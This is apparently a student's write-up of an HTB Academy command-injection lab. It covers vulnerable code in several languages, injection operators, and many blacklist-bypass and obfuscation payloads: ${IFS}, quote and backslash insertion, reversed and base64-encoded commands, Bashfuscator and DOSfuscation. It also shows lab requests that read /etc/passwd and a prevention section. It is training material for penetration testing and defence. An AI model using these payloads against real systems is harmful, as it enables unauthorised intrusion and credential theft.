# Command Injections

| Field | Details |
|-------|---------|
| Module | 22 — Command Injections |
| Difficulty | Medium |
| Sections | 12 |
| Target | `10.129.43.173:32778` |
| Attacker | `10.10.16.36` |
| Date | September 2026 |

---

## Table of Contents

1. [Overview](#overview)
2. [What Are Injections](#what-are-injections)
3. [Vulnerable Code Patterns by Language](#vulnerable-code-patterns-by-language)
4. [Detection — Identifying Command Injection](#detection--identifying-command-injection)
5. [Injection Operators Reference](#injection-operators-reference)
6. [Injecting Commands](#injecting-commands)
7. [Identifying and Bypassing Filters](#identifying-and-bypassing-filters)
8. [Bypassing Blacklisted Commands](#bypassing-blacklisted-commands)
9. [Advanced Command Obfuscation](#advanced-command-obfuscation)
10. [Evasion Tools](#evasion-tools)
11. [Command Injection Prevention](#command-injection-prevention)
12. [Key Tools Reference](#key-tools-reference)
13. [MITRE ATT&CK Mapping](#mitre-attck-mapping)

---

## Overview

Command Injection is ranked among the most critical web vulnerabilities — it allows an attacker to execute arbitrary OS commands directly on the back-end hosting server. When user-supplied input is passed to a shell command without sanitisation, an attacker can break out of the intended command and append their own, resulting in full server compromise.

Command injection is consistently listed in **OWASP Top 10** under **Injection (A03)** — and because a successful injection delivers an OS-level foothold, it can cascade to:

- Full file system access (read, write, delete)
- Credential theft from config files and environment variables
- Lateral movement to internal networks
- Persistent backdoor installation (reverse shell, cron job, systemd service)
- Complete back-end server compromise

### Injection Type Comparison

| Injection Type | Where It Occurs | Impact |
|---------------|----------------|--------|
| OS Command Injection | User input used in OS command functions | Full RCE on the host server |
| SQL Injection | User input in SQL query strings | Database dump, authentication bypass |
| Code Injection | User input passed to `eval()`/`exec()` | RCE at the application runtime level |
| XSS/HTML Injection | User input rendered in HTML responses | Browser-level JS execution, session theft |
| LDAP Injection | User input in LDAP queries | Directory enumeration, authentication bypass |
| XXE Injection | User input processed by XML parsers | Local file read, SSRF, RCE |

---

## What Are Injections

Injection vulnerabilities occur when user-controlled input is misinterpreted as part of a query or code being executed. The root cause is always the same: **trust placed in user input**.

When it comes to OS Command Injection specifically, the user input — directly or indirectly — reaches a function that executes shell commands. All major web frameworks provide such functions:

| Framework | Functions |
|-----------|-----------|
| **PHP** | `exec()`, `system()`, `shell_exec()`, `passthru()`, `popen()` |
| **NodeJS** | `child_process.exec()`, `child_process.spawn()` |
| **Python** | `os.system()`, `subprocess.call()`, `subprocess.run()` |
| **Java** | `Runtime.exec()`, `ProcessBuilder` |
| **.NET** | `System.Diagnostics.Process.Start()` |

---

## Vulnerable Code Patterns by Language

### PHP

```php
<?php
// VULNERABLE — filename from GET parameter passed directly to system()
if (isset($_GET['filename'])) {
    system("touch /tmp/" . $_GET['filename'] . ".pdf");
}
?>
```

**Attack:** `?filename=test;whoami` → executes `touch /tmp/test;whoami.pdf` — the `;` terminates the first command and `whoami` executes independently.

**All vulnerable PHP functions:**

```php
exec($_GET['input']);
system($_GET['input']);
shell_exec($_GET['input']);
passthru($_GET['input']);
popen($_GET['input'], 'r');
eval($_GET['input']);       // code injection
```

---

### NodeJS

```javascript
// VULNERABLE — child_process.exec with user input
app.get("/createfile", function(req, res){
    child_process.exec(`touch /tmp/${req.query.filename}.txt`);
});
```

**Attack:** `?filename=test;whoami` → executes `touch /tmp/test;whoami.txt`

---

### Python

```python
# VULNERABLE — os.system with user input
import os
filename = request.args.get('filename')
os.system("touch /tmp/" + filename + ".pdf")
```

---

### Java

```java
// VULNERABLE — Runtime.exec with user input
String filename = request.getParameter("filename");
Runtime.getRuntime().exec("touch /tmp/" + filename + ".pdf");
```

---

## Detection — Identifying Command Injection

### Step 1 — Understand the Application Context

Find functionality that likely calls OS commands on the back end:

- **Network utilities** — ping, traceroute, nslookup, whois
- **File operations** — compress, convert, preview, rename, move, copy
- **System utilities** — uptime, check service status, cron management
- **Package managers** — install/update functionality

### Step 2 — Test with Injection Operators

A Host Checker utility that calls `ping -c 1 <USER_INPUT>` is a classic example. The moment we can control any part of a shell command, we test every injection operator.

### Step 3 — Confirm via Output Change

If the output changes to include our injected command's results, injection is confirmed. For blind injection (no output displayed), use time-based detection:

```bash
# Time-based detection — if the page takes 5 extra seconds, injection is confirmed
127.0.0.1; sleep 5
```

---

## Injection Operators Reference

| Operator | Character | URL-Encoded | Behaviour |
|----------|-----------|-------------|----------|
| **Semicolon** | `;` | `%3b` | Executes both commands sequentially — most reliable |
| **New Line** | `\n` | `%0a` | Executes both commands — bypasses many `;` blacklists |
| **Background** | `&` | `%26` | Executes both — second output usually appears first |
| **Pipe** | `\|` | `%7c` | Executes both — only second command output shown |
| **AND** | `&&` | `%26%26` | Executes second only if first succeeds |
| **OR** | `\|\|` | `%7c%7c` | Executes second only if first fails |
| **Sub-Shell** | `` ` ` `` | `%60%60` | Executes inside sub-shell — Linux only |
| **Sub-Shell** | `$()` | `%24%28%29` | Executes inside sub-shell — Linux only |

### When to Use Each Operator

| Scenario | Best Operator |
|----------|--------------|
| First command must succeed (e.g., `ping`) | `;` or `\n` or `&` |
| First command fails (error triggers filter) | `\|\|` — runs second on failure |
| Want only our output, not the original | `\|` — pipes first into second (shows only second) |
| Need sub-shell for complex commands | `$()` |
| `;` is blacklisted | `%0a` (newline) |

---

## Injecting Commands

### Basic Injection

```
# Payload: 127.0.0.1; whoami
# Resulting command: ping -c 1 127.0.0.1; whoami
```

Verify locally first:

```bash
Hackerpatel007_1@htb[/htb]$ ping -c 1 127.0.0.1; whoami

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=1.03 ms
--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss
www-data
```

---

### Bypassing Front-End Validation

Front-end JavaScript validation blocks malicious characters in the browser — but never reaches the back-end. It is trivially bypassed by intercepting and modifying the HTTP request before it leaves the browser.

**Method 1 — Burp Suite Intercept:**

```
1. Activate BURP in FoxyProxy
2. Submit a valid IP (127.0.0.1) — let it be intercepted
3. In Burp Proxy -> Intercept: modify ip= value
4. Change 127.0.0.1 to 127.0.0.1; whoami
5. URL-encode the payload: CTRL+U in Burp
6. Forward the request
```

```http
POST /index.php HTTP/1.1
Host: 10.129.43.173:32778
Content-Type: application/x-www-form-urlencoded

ip=127.0.0.1%3b+whoami
```

**Response:**

```
PING 127.0.0.1 ...
www-data
```

**Method 2 — Disable JS Validation via DevTools:**

```
F12 -> Inspector -> Find the input element
Remove or edit the validation pattern attribute
Submit directly from the browser
```

**Method 3 — curl directly:**

```bash
Hackerpatel007_1@htb[/htb]$ curl -s "http://10.129.43.173:32778/index.php" \
  --data-urlencode "ip=127.0.0.1; whoami"
```

---

## Identifying and Bypassing Filters

### Filter and WAF Detection

When `127.0.0.1; whoami` returns `Invalid input` instead of executing, identify exactly which component is blocked:

**Test each component separately:**

```
127.0.0.1;          -> Invalid input  <- semicolon is blacklisted
127.0.0.1           -> Valid          <- IP is fine
127.0.0.1 whoami    -> Invalid input  <- space + command is blocked
```

Isolate the exact blocked character by reducing the payload one character at a time.

**WAF vs Application filter:**
- **Application filter** — generic error message in the page body
- **WAF block** — separate page with your IP, request details, incident ID

---

### Bypassing Blacklisted Characters

#### Newline — Replace `;`

When `;` is blacklisted, use a newline character (`%0a`) which is typically not filtered:

```
127.0.0.1%0awhoami
```

URL-encoded newline is interpreted as a command terminator by bash — identical effect to `;`.

---

### Bypassing Blacklisted Spaces

**Method 1 — `${IFS}` Environment Variable:**

`${IFS}` (Internal Field Separator) is a bash variable whose default value is whitespace (space, tab, newline). It substitutes directly for a space:

```bash
# Test locally
Hackerpatel007_1@htb[/htb]$ cat${IFS}/etc/passwd
root:x:0:0:root:/root:/bin/bash

# Use in injection payload
127.0.0.1%0acat${IFS}/etc/passwd
```

**Method 2 — Brace Expansion `{}`:**

```bash
Hackerpatel007_1@htb[/htb]$ {cat,/etc/passwd}
root:x:0:0:root:/root:/bin/bash
```

Bash brace expansion executes `cat` with `/etc/passwd` as its argument — no space character needed.

**Method 3 — Tab Character `%09`:**

```bash
# Tab (ASCII 0x09) works as a command separator in bash
127.0.0.1%0awhoami%09
```

**Method 4 — Windows Environment Variable `%VARIABLE:~START,LENGTH%`:**

```cmd
# %TMP% typically starts with a space — extract it
C:\htb> ping%CommonProgramFiles:~10,-18%127.0.0.1
```

**Space bypass summary:**

| Method | Payload | Works On |
|--------|---------|----------|
| IFS variable | `${IFS}` | Linux |
| Tab character | `%09` | Linux + Windows |
| Brace expansion | `{cmd,arg}` | Linux |
| ENV variable | `%VARIABLE:~X,Y%` | Windows CMD |
| Newline | `%0a` | Linux + Windows |

---

### Bypassing Blacklisted Slashes

#### Linux — Environment Variable Substring

```bash
# $PATH typically starts with /usr/... — extract just the /
Hackerpatel007_1@htb[/htb]$ echo ${PATH:0:1}
/

# Use in payload — produce /etc/passwd without using /
127.0.0.1%0als${IFS}${PATH:0:1}etc${PATH:0:1}passwd
```

Get a semi-colon from `$LS_COLORS`:

```bash
Hackerpatel007_1@htb[/htb]$ echo ${LS_COLORS:10:1}
;

# Combined bypass — semi-colon and space from environment variables only
127.0.0.1${LS_COLORS:10:1}${IFS}whoami
```

#### Linux — Character Shifting

```bash
# ASCII table: / = 92, [ = 91
# Shift [ by 1 -> produces /
Hackerpatel007_1@htb[/htb]$ echo $(tr '!-}' '"–~'<<<[)
/
```

#### Windows CMD — Variable Substring

```cmd
# %HOMEPATH% = \Users\htb-student — extract just the \
C:\htb> echo %HOMEPATH:~6,-11%
\
```

#### Windows PowerShell — Array Index

```powershell
# String is treated as array of characters — index 0 = \
PS C:\htb> $env:HOMEPATH[0]
\
PS C:\htb> $env:PROGRAMFILES[10]
\
```

---

## Bypassing Blacklisted Commands

A command blacklist checks for exact string matches — it does not execute the command to check its behaviour. Obfuscating the command string bypasses the check while the shell still executes correctly.

### Quote Insertion — Linux and Windows

Bash and PowerShell both ignore quote characters embedded inside a command name:

```bash
# Single quotes — Linux and Windows
Hackerpatel007_1@htb[/htb]$ w'h'o'am'i
www-data

# Double quotes — Linux and Windows
Hackerpatel007_1@htb[/htb]$ w"h"o"am"i
www-data
```

**Rules:**
- Quotes must be balanced (even number)
- Single and double quotes cannot be mixed within one obfuscated word
- Works in both bash and PowerShell

**Injection payload:**

```
127.0.0.1%0aw'h'o'am'i
```

---

### Backslash and Positional Parameter — Linux Only

```bash
# Backslash — ignored by bash, number can be odd
Hackerpatel007_1@htb[/htb]$ w\ho\am\i
www-data

# $@ positional parameter — expands to nothing when no args
Hackerpatel007_1@htb[/htb]$ who$@ami
www-data
```

---

### Caret Character — Windows Only

```cmd
C:\htb> who^ami
21y4d
```

The `^` caret is a CMD escape character that is ignored when not followed by a special character.

---

## Advanced Command Obfuscation

### Case Manipulation

**Windows CMD/PowerShell — Case-insensitive by design:**

```powershell
PS C:\htb> WhOaMi
21y4d
```

**Linux bash — Case-sensitive — use `tr` to convert mixed case:**

```bash
Hackerpatel007_1@htb[/htb]$ $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
www-data

# If spaces are blocked, replace with tabs
127.0.0.1%0a$(tr%09"[A-Z]"%09"[a-z]"<<<"WhOaMi")

# Alternative using printf
$(a="WhOaMi";printf %s "${a,,}")
```

---

### Reversed Commands

Reverse the command string, then un-reverse it in a sub-shell for execution:

**Linux:**

```bash
# Get reversed string
Hackerpatel007_1@htb[/htb]$ echo 'whoami' | rev
imaohw

# Execute by reversing back in sub-shell
Hackerpatel007_1@htb[/htb]$ $(rev<<<'imaohw')
www-data

# Read a file using reversed command
Hackerpatel007_1@htb[/htb]$ echo 'cat /etc/passwd' | rev
dwssap/cte/ tac

$(rev<<<'dwssap/cte/ tac')
root:x:0:0:root:/root:/bin/bash
```

**Injection payload:**

```
127.0.0.1%0a$(rev<<<'imaohw')
```

**Windows PowerShell:**

```powershell
# Reverse the string
PS C:\htb> "whoami"[-1..-20] -join ''
imaohw

# Execute by reversing back
PS C:\htb> iex "$('imaohw'[-1..-20] -join '')"
21y4d
```

---

### Encoded Commands — Base64

Base64-encode the entire command to avoid filtered characters entirely. The encoded string contains only alphanumeric characters and `+`, `=` — none of which are typically blacklisted.

**Linux:**

```bash
# Step 1 — encode the command
Hackerpatel007_1@htb[/htb]$ echo -n 'cat /etc/passwd | grep 33' | base64
Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==

# Step 2 — decode and execute via sub-shell + bash heredoc
Hackerpatel007_1@htb[/htb]$ bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

> **Note:** `<<<` (here-string) replaces the `|` pipe character which may be blacklisted. The command reads: decode the base64 string, pass it as input to bash, execute as a shell command.

**Injection payload (spaces replaced with `${IFS}`):**

```
127.0.0.1%0abash<<<$(base64${IFS}-d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

**Windows PowerShell:**

```powershell
# Step 1 — encode as UTF-16LE Base64 (required for PowerShell -EncodedCommand)
PS C:\htb> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
dwBoAG8AYQBtAGkA

# Or from Linux:
Hackerpatel007_1@htb[/htb]$ echo -n whoami | iconv -f utf-8 -t utf-16le | base64
dwBoAG8AYQBtAGkA

# Step 2 — decode and execute
PS C:\htb> iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
21y4d
```

**Quick reference — encoding common commands:**

```bash
Hackerpatel007_1@htb[/htb]$ echo -n 'id' | base64
aWQ=

Hackerpatel007_1@htb[/htb]$ echo -n 'cat /etc/passwd' | base64
Y2F0IC9ldGMvcGFzc3dk

Hackerpatel007_1@htb[/htb]$ echo -n 'ls /var/www/html' | base64
bHMgL3Zhci93d3cvaHRtbA==
```

---

## Evasion Tools

### Bashfuscator — Linux

Automatically obfuscates bash commands using multiple layered techniques — character reversal, encoded strings, variable manipulation, and more.

```bash
# Clone and install
Hackerpatel007_1@htb[/htb]$ git clone https://github.com/Bashfuscator/Bashfuscator
Hackerpatel007_1@htb[/htb]$ cd Bashfuscator
Hackerpatel007_1@htb[/htb]$ pip3 install setuptools==65
Hackerpatel007_1@htb[/htb]$ python3 setup.py install --user
Hackerpatel007_1@htb[/htb]$ cd ./bashfuscator/bin/

# Basic obfuscation (random technique — may produce very long output)
Hackerpatel007_1@htb[/htb]$ ./bashfuscator -c 'cat /etc/passwd'

[+] Mutators used: Token/ForCode -> Command/Reverse
[+] Payload:
 ${*/+27\[X\(} ...SNIP...  ${*~}

# Controlled obfuscation — short, single layer, no mangling
Hackerpatel007_1@htb[/htb]$ ./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1

[+] Mutators used: Token/ForCode
[+] Payload:
eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"

# Test the obfuscated command
Hackerpatel007_1@htb[/htb]$ bash -c 'eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"'

root:x:0:0:root:/root:/bin/bash
...
```

**Flags:**

| Flag | Purpose |
|------|---------|
| `-c COMMAND` | Command to obfuscate |
| `-s 1` | Payload size level (1=smallest) |
| `-t 1` | Number of obfuscation types |
| `--no-mangling` | Disable extra mangling |
| `--layers N` | Number of obfuscation layers |
| `-l` | List all available obfuscators |

---

### DOSfuscation — Windows

Interactive PowerShell tool that obfuscates Windows CMD commands using environment variable encoding and binary substitution.

```powershell
# Clone and import
PS C:\htb> git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
PS C:\htb> cd Invoke-DOSfuscation
PS C:\htb> Import-Module .\Invoke-DOSfuscation.psd1
PS C:\htb> Invoke-DOSfuscation

# Set the target command
Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt

# Apply environment variable encoding (option 1)
Invoke-DOSfuscation> encoding
Invoke-DOSfuscation\Encoding> 1
```

```
Result:
typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt
```

```cmd
# Verify the obfuscated command works in CMD
C:\htb> typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt

test_flag
```

The obfuscated command uses Windows environment variable substrings to reconstruct each character — entirely bypassing string-based blacklist checks.

---

## Command Injection Prevention

### Avoid System Command Functions

Never use OS command execution functions when built-in language equivalents exist:

```php
// WRONG — uses shell to check host
system("ping -c 1 " . $_GET['ip']);

// CORRECT — use PHP's native socket function
$sock = fsockopen($_GET['ip'], 80, $errno, $errstr, 1);
if ($sock) { echo "Host is up"; }
```

### Input Validation

Validate before processing — reject anything that does not match the expected format:

**PHP:**

```php
// Built-in IP validation
if (filter_var($_GET['ip'], FILTER_VALIDATE_IP)) {
    // process
} else {
    die("Invalid IP address");
}

// Custom regex validation
if (!preg_match('/^(\d{1,3}\.){3}\d{1,3}$/', $_GET['ip'])) {
    die("Invalid IP format");
}
```

**JavaScript/NodeJS:**

```javascript
// Full IP regex validation — only allows valid octets
if(/^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(ip)){
    // call function
} else {
    // deny
}

// Or use the is-ip npm library
const isIp = require('is-ip');
if (isIp(ip)) { ... }
```

### Input Sanitization

Remove all non-required special characters from user input — this is the most critical control:

**PHP:**

```php
// Allow only alphanumeric and dots (for IPs)
$ip = preg_replace('/[^A-Za-z0-9.]/', '', $_GET['ip']);

// Or escape shell special characters
$ip = escapeshellcmd($_GET['ip']);
$ip = escapeshellarg($_GET['ip']); // wraps in single quotes
```

**JavaScript:**

```javascript
// Remove non-alphanumeric characters
var ip = ip.replace(/[^A-Za-z0-9.]/g, '');

// Or use DOMPurify for NodeJS
import DOMPurify from 'dompurify';
var ip = DOMPurify.sanitize(ip);
```

> **Important:** Blacklisting specific characters (`;`, `|`, `&`) is not sufficient — as this module demonstrates, dozens of bypass techniques exist. Always use allowlist-based sanitisation that permits only necessary characters.

### Server Configuration

```ini
# PHP — disable dangerous execution functions
disable_functions = exec, system, shell_exec, passthru, popen, proc_open

# PHP — restrict web app to its directory
open_basedir = /var/www/html

# Run web server as low-privileged user
User = www-data
Group = www-data
```

**Defence-in-depth checklist:**

| Control | Implementation |
|---------|---------------|
| Principle of Least Privilege | Run web server as `www-data` — not root |
| Disable dangerous functions | `disable_functions` in `php.ini` |
| Scope restriction | `open_basedir` limits file access to web root |
| WAF | ModSecurity (Apache) or Cloudflare/Fortinet externally |
| Reject double-encoded URLs | Web server configuration — block `%25` in URLs |
| Disable legacy modules | Disable PHP CGI, outdated Apache modules |
| Input validation — both ends | Front-end + back-end — never trust front-end alone |

---

## Key Tools Reference

| Command | Purpose |
|---------|---------|
| `127.0.0.1; whoami` | Basic semicolon injection test |
| `127.0.0.1%0awhoami` | Newline injection — bypasses semicolon blacklist |
| `127.0.0.1%26whoami` | Ampersand injection (URL-encoded `&`) |
| `127.0.0.1\|whoami` | Pipe injection — shows only second command output |
| `127.0.0.1\|\|whoami` | OR injection — executes second command if first fails |
| `cat${IFS}/etc/passwd` | Space bypass using `${IFS}` |
| `{cat,/etc/passwd}` | Space bypass using brace expansion |
| `cat%09/etc/passwd` | Space bypass using tab character `%09` |
| `echo${IFS}${PATH:0:1}` | Extract `/` from PATH environment variable |
| `echo${IFS}${LS_COLORS:10:1}` | Extract `;` from LS_COLORS environment variable |
| `echo $(tr '!-}' '"–~'<<<[)` | Character shifting — produce `/` from `[` |
| `w'h'o'am'i` | Quote insertion command obfuscation |
| `w"h"o"am"i` | Double-quote insertion command obfuscation |
| `w\ho\am\i` | Backslash insertion — Linux only |
| `who$@ami` | Positional parameter insertion — Linux only |
| `who^ami` | Caret insertion — Windows CMD only |
| `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")` | Case manipulation — Linux |
| `$(rev<<<'imaohw')` | Reversed command execution — Linux |
| `iex "$('imaohw'[-1..-20] -join '')"` | Reversed command execution — Windows PowerShell |
| `echo -n 'whoami' \| base64` | Base64-encode a command |
| `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk)` | Decode and execute base64-encoded command |
| `./bashfuscator -c 'whoami' -s 1 -t 1 --no-mangling --layers 1` | Automated bash command obfuscation |
| `Invoke-DOSfuscation` | Interactive Windows CMD obfuscation tool |
| `curl -s http://10.129.43.173:32778/ --data-urlencode "ip=127.0.0.1; whoami"` | Send injection payload directly via curl |
| `filter_var($_GET['ip'], FILTER_VALIDATE_IP)` | PHP built-in IP validation |
| `preg_replace('/[^A-Za-z0-9.]/', '', $_GET['ip'])` | PHP input sanitization — allow only alphanumeric and dot |

---

## MITRE ATT&CK Mapping

| Technique | Sub-Technique | Description |
|-----------|---------------|-------------|
| T1059 | T1059.004 | Command and Scripting Interpreter: Unix Shell — OS command injection via bash |
| T1059 | T1059.003 | Command and Scripting Interpreter: Windows Command Shell — CMD injection via semicolon/pipe |
| T1059 | T1059.001 | Command and Scripting Interpreter: PowerShell — PowerShell injection and DOSfuscation |
| T1190 | — | Exploit Public-Facing Application — command injection via web form parameters |
| T1027 | T1027.001 | Obfuscated Files or Information — base64 encoding, case manipulation, reversed commands, Bashfuscator |
| T1562 | T1562.001 | Impair Defences: Disable or Modify Tools — WAF bypass via character substitution, encoding, obfuscation |
| T1083 | — | File and Directory Discovery — `ls`, `find` via injected commands |
| T1005 | — | Data from Local System — `cat /etc/passwd`, config file reads via injected commands |
| T1552 | T1552.001 | Unsecured Credentials: Credentials in Files — reading DB config, SSH keys via shell injection |
| T1041 | — | Exfiltration Over C2 Channel — reverse shell via injected `bash -i` or `nc` command |

---

*Module completed as part of the HTB Academy CPTS path.*  
*Penetration Tester role in India | Target: January 2027*
